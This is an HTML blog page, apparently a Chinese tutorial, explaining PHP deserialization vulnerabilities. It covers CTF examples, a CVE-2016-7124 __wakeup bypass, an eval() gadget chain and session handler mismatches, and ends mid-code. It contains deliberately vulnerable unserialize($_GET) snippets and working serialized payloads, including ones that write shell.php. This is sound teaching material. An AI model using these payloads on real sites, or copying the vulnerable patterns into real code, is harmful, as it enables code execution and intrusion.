@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>php序列化与反序列化 | Gridea</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://outlaws-bai.github.io/favicon.ico?v=1616040140670">
+<link rel="stylesheet" href="https://outlaws-bai.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="序列化与反序列化
+序列化
+定义：利用serialize()函数将一个对象转换为字符串形式
+我们先看一下直接输出对象是什么效果，代码如下
+&lt;?php
+    class test{
+        public $name=&quot;..." />
+    <meta name="keywords" content="knowledge-web" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://outlaws-bai.github.io">
+        <img src="https://outlaws-bai.github.io/images/avatar.png?v=1616040140670" class="site-logo">
+        <h1 class="site-title">Gridea</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://outlaws-bai.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">php序列化与反序列化</h2>
+            <div class="post-date">2021-03-18</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="序列化与反序列化">序列化与反序列化</h1>
+<h2 id="序列化">序列化</h2>
+<p>定义：利用<code>serialize()</code>函数将一个对象转换为字符串形式<br>
+我们先看一下直接输出对象是什么效果，代码如下</p>
+<pre><code>&lt;?php
+    class test{
+        public $name=&quot;ghtwf01&quot;;
+        public $age=&quot;18&quot;;
+    }
+    $a=new test();
+    print_r($a);
+?&gt;
+</code></pre>
+<p>效果如下<br>
+<a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144212-8e85e4f4-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144212-8e85e4f4-0517-1.png" alt="img" loading="lazy"></a><br>
+这个时候我们利用<code>serialize()</code>函数将这个对象进行序列化成字符串然后输出，代码如下</p>
+<pre><code>&lt;?php
+    class test{
+        public $name=&quot;ghtwf01&quot;;
+        public $age=&quot;18&quot;;
+    }
+    $a=new test();
+    $a=serialize($a);
+    print_r($a);
+?&gt;
+</code></pre>
+<p>效果如下</p>
+<figure data-type="image" tabindex="1"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144234-9c15d5ca-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144234-9c15d5ca-0517-1.png" alt="img" loading="lazy"></a></figure>
+<p>如果不是<code>public</code>方法那么后面的读取方法就有点不一样，例如代码如下</p>
+<pre><code>&lt;?php
+    class test{
+        public $name=&quot;ghtwf01&quot;;
+        private $age=&quot;18&quot;;
+        protected $sex=&quot;man&quot;;
+    }
+    $a=new test();
+    $a=serialize($a);
+    print_r($a);
+?&gt;
+</code></pre>
+<p>效果如下</p>
+<figure data-type="image" tabindex="2"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144245-a2973722-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144245-a2973722-0517-1.png" alt="img" loading="lazy"></a></figure>
+<p>private分析：<br>
+这样就发现本来是<code>age</code>结果上面出现的是<code>testage</code>，而且<code>testage</code>长度为<code>7</code>，但是上面显示的是<code>9</code><br>
+查找资料后发现<strong>private属性序列化的时候格式是%00类名%00成员名</strong>，<code>%00</code>占一个字节长度，所以<code>age</code>加了类名后变成了<code>testage</code>长度为<code>9</code></p>
+<p>protect分析：<br>
+本来是<code>sex</code>结果上面出现的是<code>*sex</code>，而且<code>*sex</code>的长度是<code>4</code>，但是上面显示的是<code>6</code>，同样查找资料后发现<strong>protect属性序列化的时候格式是%00*%00成员名</strong></p>
+<p>这里介绍一下public、private、protected的区别</p>
+<pre><code>public(公共的):在本类内部、外部类、子类都可以访问
+
+protect(受保护的):只有本类或子类或父类中可以访问
+
+private(私人的):只有本类内部可以使用
+</code></pre>
+<h2 id="反序列化">反序列化</h2>
+<p>定义：反序列化就是利用<code>unserailize()</code>函数将一个经过序列化的字符串还原成php代码形式，代码如下</p>
+<pre><code>&lt;?php
+    $b='序列化字符串';
+    $b=unserialize($b);
+?&gt;
+</code></pre>
+<h1 id="反序列化漏洞原理">反序列化漏洞原理</h1>
+<p>到这儿也许大家会想着序列化过去再反序列化回来，不就是形式之间的转换吗，和漏洞有什么关系<br>
+这里先掌握php常见的魔术方法，先列出几个最常见的魔术方法，当遇到这些的时候就需要注意了<br>
+附上讲解魔术方法的链接：https://segmentfault.com/a/1190000007250604</p>
+<pre><code>__construct()当一个对象创建时被调用
+
+__destruct()当一个对象销毁时被调用
+
+__toString()类被当做字符串使用时的回应方法
+
+__sleep() 在对象在被序列化之前运行
+
+__wakeup将在序列化之后立即被调用
+</code></pre>
+<p>我们用代码演示一下这些魔术方法的使用效果</p>
+<pre><code>&lt;?php
+    class test{
+        public $a='hacked by ghtwf01';
+        public $b='hacked by blckder02';
+        public function pt(){
+            echo $this-&gt;a.'&lt;br /&gt;';
+        }
+        public function __construct(){
+            echo '__construct&lt;br /&gt;';
+        }
+        public function __destruct(){
+            echo '__construct&lt;br /&gt;';
+        }
+        public function __sleep(){
+            echo '__sleep&lt;br /&gt;';
+            return array('a','b');
+        }
+        public function __wakeup(){
+            echo '__wakeup&lt;br /&gt;';
+        }
+    }
+    //创建对象调用__construct
+    $object = new test();
+    //序列化对象调用__sleep
+    $serialize = serialize($object);
+    //输出序列化后的字符串
+    echo 'serialize: '.$serialize.'&lt;br /&gt;';
+    //反序列化对象调用__wakeup
+    $unserialize=unserialize($serialize);
+    //调用pt输出数据
+    $unserialize-&gt;pt();
+    //脚本结束调用__destruct
+?&gt;
+</code></pre>
+<p>运行效果如下：</p>
+<figure data-type="image" tabindex="3"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144317-b5673690-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144317-b5673690-0517-1.png" alt="img" loading="lazy"></a></figure>
+<p>原来有一个实例化出的对象，然后又反序列化出了一个对象，就存在两个对象，所以最后销毁了两个对象也就出现了执行了两次<code>__destruct</code></p>
+<p>这里我们看一个存在反序列化漏洞的代码</p>
+<pre><code>&lt;?php
+class A{
+    public $test = &quot;demo&quot;;
+    function __destruct(){
+            echo $this-&gt;test;
+    }
+}
+$a = $_GET['value'];
+$a_unser = unserialize($a);
+?&gt;
+</code></pre>
+<p>这样我们就可以利用这个反序列化代码，利用方法是将需要使用的代码序列化后传入，看到这段代码上面有<code>echo</code>，我们尝试一下在这个页面显示<code>hacked by ghtwf01</code>的字符，现在一边将这段字符串进行序列化，代码如下(这里的类名和对象名要和存在漏洞的代码一致，类名为<code>A</code>,对象名为<code>test</code>)</p>
+<pre><code>&lt;?php
+    class A{
+        public $test=&quot;hacked by ghtwf01&quot;;
+    }
+    $b= new A();
+    $result=serialize($b);
+    print_r($result);
+?&gt;
+</code></pre>
+<p>这样就得到这段字符序列化后的内容</p>
+<figure data-type="image" tabindex="4"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144328-bc4e7b80-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144328-bc4e7b80-0517-1.png" alt="img" loading="lazy"></a></figure>
+<p>将它传入目标网页，返回结果如下</p>
+<figure data-type="image" tabindex="5"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144337-c162628a-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144337-c162628a-0517-1.png" alt="img" loading="lazy"></a></figure>
+<p>既然网页上能输出，那说明也可以进行XSS攻击，尝试一下，虽然有点鸡肋2333，到这里应该懂得点什么叫反序列化漏洞了</p>
+<figure data-type="image" tabindex="6"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144342-c4a63282-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144342-c4a63282-0517-1.png" alt="img" loading="lazy"></a></figure>
+<p>一道简单的反序列化考点题<br>
+http://120.79.33.253:9001/</p>
+<pre><code>&lt;?php
+error_reporting(0);
+include &quot;flag.php&quot;;
+$KEY = &quot;D0g3!!!&quot;;
+$str = $_GET['str'];
+if (unserialize($str) === &quot;$KEY&quot;)
+{
+    echo &quot;$flag&quot;;
+}
+show_source(__FILE__);
+</code></pre>
+<p>题目的大意就是反序列化一个变量后的值等于<code>D0g3!!!</code>，这个变量是用户输入的，于是我们写代码将<code>D0g3!!!</code>序列化</p>
+<pre><code>&lt;?php
+    $a=&quot;D0g3!!!&quot;;
+    $b=serialize($a);
+    echo $b;
+?&gt;
+</code></pre>
+<p>得到序列化后的内容是</p>
+<figure data-type="image" tabindex="7"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144356-ccd49fe8-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144356-ccd49fe8-0517-1.png" alt="img" loading="lazy"></a></figure>
+<p>将序列化后的内容传入得到flag</p>
+<figure data-type="image" tabindex="8"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144404-d13ff460-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144404-d13ff460-0517-1.png" alt="img" loading="lazy"></a></figure>
+<p>现在再来一道bugku的反序列化题<br>
+welcome to bugctf(这道题被恶搞的删了qwq，只好看看网上贴出的代码分析一下)</p>
+<p>index.php</p>
+<pre><code>&lt;?php  
+
+$txt = $_GET[&quot;txt&quot;];  
+
+$file = $_GET[&quot;file&quot;];  
+
+$password = $_GET[&quot;password&quot;];  
+
+if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')===&quot;welcome to the bugkuctf&quot;)){  
+
+    echo &quot;hello friend!&lt;br&gt;&quot;;  
+
+    if(preg_match(&quot;/flag/&quot;,$file)){ 
+
+        echo &quot;不能现在就给你flag哦&quot;;
+
+        exit();  
+
+    }else{  
+
+        include($file);   
+
+        $password = unserialize($password);  
+
+        echo $password;  
+
+    }  
+
+}else{  
+
+    echo &quot;you are not the number of bugku ! &quot;;  
+
+}  
+
+?&gt;
+</code></pre>
+<p>代码有点长我们先来分析一下这串代码想表达什么<br>
+1.先<code>GET</code>传入参数<code>$txt</code>、<code>$file</code>、<code>$password</code><br>
+2.判断<code>$txt</code>是否存在，如果存在并且值为<code>welcome to the bugkuctf</code>就进一步操作，<code>$file</code>参数里面不能包含<code>flag</code>字段<br>
+3.通过以上判断就<code>include($file)</code>，再将<code>$password</code>反序列化并输出</p>
+<p>hint.php</p>
+<pre><code>&lt;?php   
+
+class Flag{//flag.php  
+
+    public $file;  
+
+    public function __tostring(){  
+
+        if(isset($this-&gt;file)){  
+
+            echo file_get_contents($this-&gt;file); 
+
+            echo &quot;&lt;br&gt;&quot;;
+
+        return (&quot;good&quot;);
+
+        }  
+
+    }  
+
+}  
+
+?&gt;
+index.php`里面要求`$file`参数不能包含`flag`字段，所以文件不能包含`flag.php`，所以`$file=hint.php`，把`hint.php`包含进去，里面存在一个`file_get_concents函数`可以读文件，想到`index.php`里面的`unserialize`函数，所以只需要控制`$this-&gt;file`就能读取想要的文件
+用这段代码的结果传值给`$password
+&lt;?php
+    class Flag{
+        public $file='flag.php';
+    }
+    $a=new Flag();
+    $b=serialize($a);
+    echo $b;
+?&gt;
+$password`进行反序列化后`$file`就被赋值为`flag.php`，然后`file_get_contents`就得到了`flag
+</code></pre>
+<figure data-type="image" tabindex="9"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144423-dd119f00-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144423-dd119f00-0517-1.png" alt="img" loading="lazy"></a></figure>
+<p>再来一个反序列化漏洞利用例子，代码如下</p>
+<pre><code>&lt;?php
+    class foo{
+        public $file = &quot;2.txt&quot;;
+        public $data = &quot;test&quot;;
+        function __destruct(){
+            file_put_contents(dirname(__FILE__).'/'.$this-&gt;file,$this-&gt;data);
+        }
+    }
+    $file_name = $_GET['filename'];
+    print &quot;You have readfile &quot;.$file_name;
+    unserialize(file_get_contents($file_name));
+?&gt;
+</code></pre>
+<p>这串代码的意思是将读取的文件内容进行反序列化，<code>__destruct</code>函数里面是生成文件，如果我们本地存在一个文件名是<code>flag.txt</code>，里面的内容是</p>
+<pre><code>O:3:&quot;foo&quot;:2:{s:4:&quot;file&quot;;s:9:&quot;shell.php&quot;;s:4:&quot;data&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;}
+</code></pre>
+<p>将它进行反序列化就会生成<code>shell.php</code>里面的内容为<code>&lt;?php phpinfo();?&gt;</code></p>
+<figure data-type="image" tabindex="10"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144432-e1ef4f90-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144432-e1ef4f90-0517-1.png" alt="img" loading="lazy"></a></figure>
+<figure data-type="image" tabindex="11"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144444-e95a626a-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144444-e95a626a-0517-1.png" alt="img" loading="lazy"></a></figure>
+<h1 id="cve-2016-7124-__wakeup绕过">CVE-2016-7124 __wakeup绕过</h1>
+<p><strong>__wakeup魔法函数简介</strong><br>
+<code>unserialize()</code>会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup()</code> 方法，预先准备对象需要的资源<br>
+反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>的执行<br>
+<strong>漏洞影响版本：</strong><br>
+php5 &lt; 5.6.25<br>
+php7 &lt; 7.0.10<br>
+<strong>漏洞复现：</strong><br>
+代码如下</p>
+<pre><code>&lt;?php
+    class A{
+        public $target = &quot;test&quot;;
+        function __wakeup(){
+            $this-&gt;target = &quot;wakeup!&quot;;
+        }
+        function __destruct(){
+            $fp = fopen(&quot;D:\Program Files\PHPTutorial\WWW\zx\hello.php&quot;,&quot;w&quot;);
+            fputs($fp,$this-&gt;target);
+            fclose($fp);
+        }
+    }
+    $a = $_GET['test'];
+    $b = unserialize($a);
+    echo &quot;hello.php&quot;.&quot;&lt;br/&gt;&quot;;
+    include(&quot;./hello.php&quot;);
+?&gt;
+</code></pre>
+<p>魔法函数<code>__wakeup()</code>要比<code>__destruct()</code>先执行，所以我们之间传入<br>
+<code>O:1:&quot;A&quot;:1:{s:6:&quot;target&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;}</code><br>
+时会被先执行的<code>__wakeup()</code>函数<code>$target</code>赋值覆盖为<code>wakeup!</code>，然后生成的<code>hello.php</code>里面的内容就是<code>wakeup!</code></p>
+<figure data-type="image" tabindex="12"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144453-eebf630e-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144453-eebf630e-0517-1.png" alt="img" loading="lazy"></a></figure>
+<p>现在我们根据绕过方法：对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>的执行，对象个数原来是1我们将其改为2，也就是<br>
+<code>O:2:&quot;A&quot;:1:{s:6:&quot;target&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;}</code><br>
+就能实现绕过</p>
+<figure data-type="image" tabindex="13"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144459-f23fd856-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144459-f23fd856-0517-1.png" alt="img" loading="lazy"></a></figure>
+<h1 id="注入对象构造方法">注入对象构造方法</h1>
+<h2 id="当目标对象被private-protected修饰时反序列化漏洞的利用">当目标对象被private、protected修饰时反序列化漏洞的利用</h2>
+<p>上面说了<code>private</code>和<code>protected</code>返回长度和<code>public</code>不一样的原因，这里再写一下</p>
+<pre><code>private属性序列化的时候格式是%00类名%00成员名
+protect属性序列化的时候格式是%00*%00成员名
+</code></pre>
+<p><code>protected</code>情况下，代码如下</p>
+<pre><code>&lt;?php
+    class A{
+        protected $test = &quot;hahaha&quot;;
+        function __destruct(){
+            echo $this-&gt;test;
+        }
+    }
+    $a = $_GET['test'];
+    $b = unserialize($a);
+?&gt;
+</code></pre>
+<p>利用方式：<br>
+先用如下代码输出利用的序列化串</p>
+<pre><code>&lt;?php
+    class A{
+        protected $test = &quot;hacked by ghtwf01&quot;;
+    }
+    $a = new A();
+    $b = serialize($a);
+    print_r($b);
+?&gt;
+</code></pre>
+<p>得到<code>O:1:&quot;A&quot;:1:{s:7:&quot;*test&quot;;s:17:&quot;hacked by ghtwf01&quot;;}</code><br>
+因为<code>protected</code>是<code>*</code>号两边都有<code>%00</code>，所以必须在<code>url</code>上面也加上，否则不会利用成功</p>
+<figure data-type="image" tabindex="14"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144507-f7487f88-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144507-f7487f88-0517-1.png" alt="img" loading="lazy"></a></figure>
+<p><code>private</code>情况下，代码如下</p>
+<pre><code>&lt;?php
+    class A{
+        private $test = &quot;hacked by ghtwf01&quot;;
+    }
+    $a = new A();
+    $b = serialize($a);
+    print_r($b);
+?&gt;
+</code></pre>
+<p>利用代码这里省略吧，同上面，得到序列化后的字符串为<code>O:1:&quot;A&quot;:1:{s:7:&quot;Atest&quot;;s:17:&quot;hacked by ghtwf01&quot;;</code><br>
+因为<code>private</code>是类名<code>A</code>两边都有<code>%00</code>所以同样在<code>url</code>上面体现</p>
+<figure data-type="image" tabindex="15"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144513-fa534faa-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144513-fa534faa-0517-1.png" alt="img" loading="lazy"></a></figure>
+<h2 id="同名方法的利用">同名方法的利用</h2>
+<p>代码如下</p>
+<pre><code>&lt;?php
+    class A{
+        public $target;
+        function __construct(){
+            $this-&gt;target = new B;
+        }
+        function __destruct(){
+            $this-&gt;target-&gt;action();
+        }
+    }
+    class B{
+        function action(){
+            echo &quot;action B&quot;;
+        }
+    }
+    class C{
+        public $test;
+        function action(){
+            echo &quot;action A&quot;;
+            eval($this-&gt;test);
+        }
+    }
+    unserialize($_GET['test']);
+?&gt;
+</code></pre>
+<p>这个例子中，<code>class B</code>和<code>class C</code>有一个同名方法<code>action</code>，我们可以构造目标对象，使得析构函数调用<code>class C</code>的<code>action</code>方法，实现任意代码执行<br>
+利用代码</p>
+<pre><code>&lt;?php
+    class A{
+        public $target;
+        function __construct(){
+            $this-&gt;target = new C;
+            $this-&gt;target-&gt;test = &quot;phpinfo();&quot;;
+        }
+        function __destruct(){
+            $this-&gt;target-&gt;action();
+        }
+    }
+    class C{
+        public $test;
+        function action(){
+            echo &quot;action C&quot;;
+            eval($this-&gt;test);
+        }
+    }
+    echo serialize(new A);
+?&gt;
+</code></pre>
+<figure data-type="image" tabindex="16"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144521-ff4ec48a-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144521-ff4ec48a-0517-1.png" alt="img" loading="lazy"></a></figure>
+<h1 id="session反序列化漏洞">session反序列化漏洞</h1>
+<h2 id="什么是session">什么是session</h2>
+<p><code>session</code>英文翻译为&quot;会话&quot;，两个人聊天从开始到结束就构成了一个会话。<code>PHP</code>里的<code>session</code>主要是指客户端浏览器与服务端数据交换的对话，从浏览器打开到关闭，一个最简单的会话周期</p>
+<h2 id="php-session工作流程">PHP session工作流程</h2>
+<p>会话的工作流程很简单，当开始一个会话时，<code>PHP</code>会尝试从请求中查找会话 <code>ID</code> （通常通过会话 <code>cookie</code>），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，<code>PHP</code> 就会自动调用<code>php_session_create_id</code>函数创建一个新的会话，并且在<code>http response</code>中通过<code>set-cookie</code>头部发送给客户端保存，例如登录如下网页<code>Cokkie、Get、Post</code>都不存在<code>session id</code>，于是就使用了<code>set-cookie</code>头</p>
+<figure data-type="image" tabindex="17"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144834-72365e9a-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144834-72365e9a-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，<code>php</code>也可以自动将<code>session id</code>添加到<code>url</code>参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项</p>
+<p>会话开始之后，<code>PHP</code> 就会将会话中的数据设置到 <code>$_SESSION</code> 变量中，如下述代码就是一个在 <code>$_SESSION</code> 变量中注册变量的例子：</p>
+<pre><code>&lt;?php
+session_start();
+if (!isset($_SESSION['username'])) {
+  $_SESSION['username'] = 'ghtwf01' ;
+}
+?&gt;
+</code></pre>
+<p>代码的意思就是如果不存在<code>session</code>那么就创建一个<code>session</code><br>
+也可以用如下流程图表示</p>
+<figure data-type="image" tabindex="18"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144840-76164138-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144840-76164138-0518-1.png" alt="img" loading="lazy"></a></figure>
+<h2 id="phpini配置">php.ini配置</h2>
+<p><code>php.ini</code>里面有如下六个相对重要的配置</p>
+<pre><code>session.save_path=&quot;&quot;      --设置session的存储位置
+session.save_handler=&quot;&quot;   --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数
+session.auto_start        --指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动
+session.serialize_handler --定义用来序列化/反序列化的处理器名字，默认使用php  
+session.upload_progress.enabled --启用上传进度跟踪，并填充$ _SESSION变量，默认启用
+session.upload_progress.cleanup --读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用
+</code></pre>
+<p>如<code>phpstudy</code>下上述配置如下：</p>
+<pre><code>session.save_path = &quot;/tmp&quot;      --所有session文件存储在/tmp目录下
+session.save_handler = files    --表明session是以文件的方式来进行存储的
+session.auto_start = 0          --表明默认不启动session
+session.serialize_handler = php --表明session的默认(反)序列化引擎使用的是php(反)序列化引擎
+session.upload_progress.enabled on --表明允许上传进度跟踪，并填充$ _SESSION变量
+session.upload_progress.cleanup on --表明所有POST数据（即完成上传）后，立即清理进度信息($ _SESSION变量)
+</code></pre>
+<h2 id="php-session-的存储机制">PHP session 的存储机制</h2>
+<p>上文中提到了 <code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的，当然这个文件名也不是不变的，都是<code>sess_sessionid</code>形式</p>
+<figure data-type="image" tabindex="19"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144846-79d7b220-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144846-79d7b220-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p>打开看一下全是序列化后的内容</p>
+<figure data-type="image" tabindex="20"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144851-7c6e2e6a-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144851-7c6e2e6a-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p>现在我们来看看<code>session.serialize_handler</code>，它定义的引擎有三种</p>
+<p>| 处理器名称 | 存储格式 |<br>
+| php | 键名 + 竖线 + 经过serialize()函数序列化处理的值 |<br>
+| php_binary | 键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值|<br>
+| php_serialize(php&gt;5.5.4) | 经过serialize()函数序列化处理的数组 |</p>
+<h3 id="php处理器">php处理器</h3>
+<p>首先来看看<code>session.serialize_handler</code>等于<code>php</code>时候的序列化结果，代码如下</p>
+<pre><code>&lt;?php
+error_reporting(0);
+ini_set('session.serialize_handler','php');
+session_start();
+$_SESSION['session'] = $_GET['session'];
+?&gt;
+session`的`sessionid`其实可以看到的，为`i38age8ok4bofpiuiku3h20fh0
+</code></pre>
+<figure data-type="image" tabindex="21"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144859-81378040-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144859-81378040-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p>于是我们到<code>session</code>存储目录查看一下<code>session</code>文件内容</p>
+<figure data-type="image" tabindex="22"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144905-85162680-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144905-85162680-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p><code>session</code>为<code>$_SESSION['session']</code>的键名，<code>|</code>后为传入<code>GET</code>参数经过序列化后的值</p>
+<h3 id="php_binary处理器">php_binary处理器</h3>
+<p>再来看看<code>session.serialize_handler</code>等于<code>php_binary</code>时候的序列化结果</p>
+<pre><code>&lt;?php
+error_reporting(0);
+ini_set('session.serialize_handler','php_binary');
+session_start();
+$_SESSION['sessionsessionsessionsessionsession'] = $_GET['session'];
+?&gt;
+</code></pre>
+<p>为了更能直观的体现出格式的差别，因此这里设置了键值长度为 <code>35</code>，<code>35</code> 对应的 <code>ASCII</code> 码为<code>#</code>，所以最终的结果如下</p>
+<figure data-type="image" tabindex="23"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144911-888b7d60-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144911-888b7d60-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p><code>#</code>为键名长度对应的 <code>ASCII</code> 的值，<code>sessionsessionsessionsessionsessions</code>为键名，<code>s:7:&quot;xianzhi&quot;;</code>为传入 <code>GET</code> 参数经过序列化后的值</p>
+<h3 id="php_serialize-处理器">php_serialize 处理器</h3>
+<p>最后就是<code>session.serialize_handler</code>等于<code>php_serialize</code>时候的序列化结果，代码如下</p>
+<pre><code>&lt;?php
+error_reporting(0);
+ini_set('session.serialize_handler','php_serialize');
+session_start();
+$_SESSION['session'] = $_GET['session'];
+?&gt;
+</code></pre>
+<p>结果如下</p>
+<figure data-type="image" tabindex="24"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144917-8c3357da-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144917-8c3357da-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p><code>a:1</code>表示<code>$_SESSION</code>数组中有 <code>1</code> 个元素，花括号里面的内容即为传入<code>GET</code>参数经过序列化后的值</p>
+<h2 id="session的反序列化漏洞利用">session的反序列化漏洞利用</h2>
+<p><code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。形成的原理就是在用<code>session.serialize_handler = php_serialize</code>存储的字符可以引入 <code>|</code> , 再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， |会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。<br>
+我们创建一个<code>session.php</code>，用于传输<code>session</code>值，里面代码如下</p>
+<pre><code>&lt;?php
+error_reporting(0);
+ini_set('session.serialize_handler','php_serialize');
+session_start();
+$_SESSION['session'] = $_GET['session'];
+?&gt;
+</code></pre>
+<p>再创建一个<code>hello.php</code>，里面代码如下</p>
+<pre><code>&lt;?php
+    error_reporting(0);
+  ini_set('session.serialize_handler','php');
+  session_start();
+    class D0g3{
+    public $name = 'panda';
+    function __wakeup(){
+      echo &quot;Who are you?&quot;;
+    }
+    function __destruct(){
+      echo '&lt;br&gt;'.$this-&gt;name;
+    }
+  }
+  $str = new XianZhi();
+ ?&gt;
+</code></pre>
+<p>这两个文件的作用很清晰，<code>session.php</code>文件的处理器是<code>php_serialize</code>，<code>hello.php</code>文件的处理器是<code>php</code>，<code>session.php</code>文件的作用是传入可控的 <code>session</code>值，<code>hello.php</code>文件的作用是在反序列化开始前输出<code>Who are you?</code>，反序列化结束的时候输出<code>name</code>值<br>
+运行一下<code>hello.php</code>看一下效果</p>
+<figure data-type="image" tabindex="25"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144925-90e78454-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144925-90e78454-0518-1.png" alt="img" loading="lazy"></a></figure>
+<p>我们用如下代码来复现一下<code>session</code>的反序列化漏洞</p>
+<pre><code>&lt;?php
